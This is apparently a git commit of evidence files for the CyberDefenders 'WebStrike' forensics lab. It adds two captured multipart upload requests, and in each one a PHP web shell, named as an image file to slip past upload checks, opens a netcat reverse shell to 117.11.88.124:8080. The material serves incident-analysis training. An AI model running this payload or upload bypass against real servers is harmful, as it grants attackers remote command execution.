4027565b8bb2744e3a6a30b7d062a7f8adfa3059
bernie6401 <bernie6401@gmail.com>
2023-12-15 15:17:54 +0800

    update webstrike extracted files

---
+++ CyberDefenders/WebStrike/Extracted Files/upload(2).php
@@ -0,0 +1,19 @@
+-----------------------------26176590812480906864292095114
+Content-Disposition: form-data; name="name"
+
+asd
+-----------------------------26176590812480906864292095114
+Content-Disposition: form-data; name="email"
+
+asd@asd.com
+-----------------------------26176590812480906864292095114
+Content-Disposition: form-data; name="review"
+
+asd
+-----------------------------26176590812480906864292095114
+Content-Disposition: form-data; name="uploadedFile"; filename="image.jpg.php"
+Content-Type: application/x-php
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
+
+-----------------------------26176590812480906864292095114--
---
+++ CyberDefenders/WebStrike/Extracted Files/upload.php
@@ -0,0 +1,19 @@
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="name"
+
+asd
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="email"
+
+asd@asd.com
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="review"
+
+asd
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="uploadedFile"; filename="image.php"
+Content-Type: application/x-php
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
+
+-----------------------------240702681933131672661702936221--
